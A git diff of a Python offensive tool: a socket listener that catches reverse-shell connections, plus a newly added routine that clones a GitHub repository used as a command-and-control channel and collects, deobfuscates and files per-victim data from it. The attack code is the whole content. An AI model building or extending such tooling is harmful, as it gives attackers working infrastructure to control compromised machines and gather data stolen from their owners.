@@ -1,7 +1,12 @@
 import argparse
 from config import PARAM
+from json import loads
+from key import GIT_API_KEY
 from modules.sneaks import obfuscation
+import os
+import pathlib
 from select import select
+from shutil import rmtree
 import socket
 
 
@@ -20,7 +25,9 @@ class ShellHelper:
             self.__serverSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.__serverSoc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         if args.port == None:
-            raise Exception("NoPortSpecified", "[EE]: Destination port expected closing the program")
+            raise Exception(
+                "NoPortSpecified", "[EE]: Destination port expected closing the program"
+            )
         self.__port = args.port
         if args.key != None:
             PARAM["key"] = args.key
@@ -37,7 +44,9 @@ class ShellHelper:
         )
         self.__cSoc, self.__addr = self.__serverSoc.accept()
         print(
-            "*** Connection Initiated from {}:{} ***".format(self.__addr[0], self.__addr[1])
+            "*** Connection Initiated from {}:{} ***".format(
+                self.__addr[0], self.__addr[1]
+            )
         )
         print(self.__recvStuff())
         while True:
@@ -53,7 +62,7 @@ class ShellHelper:
                 self.stopShell()
             except ConnectionAbortedError:
                 self.stopShell()
-            
+
     def stopShell(self) -> None:
         self.__cSoc.close()
         self.__serverSoc.close()
@@ -78,8 +87,43 @@ class ShellHelper:
         return result.strip("\n")
 
 
-def pullFromGithubC2() -> None:
-    pass
+def processFromGithubC2(repo: str, sneak: str) -> None:
+    if sneak == None:
+        sneak = "nothing"
+    result: dict[str, str] = {}
+    os.mkdir("results")
+    os.system("git clone https://{}@github.com/{} c2stuff".format(GIT_API_KEY, repo))
+    for client in os.listdir("c2stuff"):
+        result = {}
+        if client != "modules":
+            print("[ii]: Processing {}".format(client))
+            dirCons = sorted(os.listdir("c2stuff/{}".format(client)))
+            for file in dirCons:
+                if file == "00_commands":
+                    pass
+                elif file == "00_results":
+                    pass  # TODO: Add processors to commands result folder
+                elif file == "00_info":
+                    with open("c2stuff/{}/00_info".format(client)) as f:
+                        info = f.read()
+                        info = obfuscation.DSNEAKS[sneak](info)
+                        info = "\n".join(info.split(" | "))
+                        result["Info"] = info
+                else:
+                    with open("c2stuff/{}/{}".format(client, file)) as f:
+                        con = f.read()
+                        con = obfuscation.DSNEAKS[sneak](con)
+                        jsonCon = loads(con)
+                        for key, val in jsonCon.items():
+                            if result.get(key) != None:
+                                result[key] += val
+                            else:
+                                result[key] = val
+        os.mkdir("c2stuff/results/{}".format(client))
+        for key, val in result.items():
+            print("Writing {}.txt to results")
+            with open("c2stuff/results/{}/{}.txt".format(client, key), "w") as f:
+                f.write(val)
 
 
 if __name__ == "__main__":
@@ -105,7 +149,7 @@ if __name__ == "__main__":
         "-r", "--refresh", action="store_true", help="Pull contents and refresh data"
     )
     parser.add_argument(
-        "-k", "--key", type=str, help="Key to use in case of encrytions"
+        "-k", "--key", type=str, help="Key to use in case of encryptions"
     )
     parser.add_argument(
         "-4", "--ipv4", action="store_true", help="Forces listener to use IPv4. Default"
@@ -124,4 +168,15 @@ if __name__ == "__main__":
             shellInstance.stopShell()
         except Exception as e:
             print(e.args[1])
-            exit(0)
+            exit(1)
+    else:
+        if args.repo == None:
+            print("[EE]: A github repository is required to refresh")
+            print("[EE]: Format <username>/<repo>")
+            exit(1)
+        try:
+            rmtree("c2stuff")
+        except FileNotFoundError:
+            pass
+        os.mkdir("c2stuff")
+        processFromGithubC2(args.repo, args.sneak)
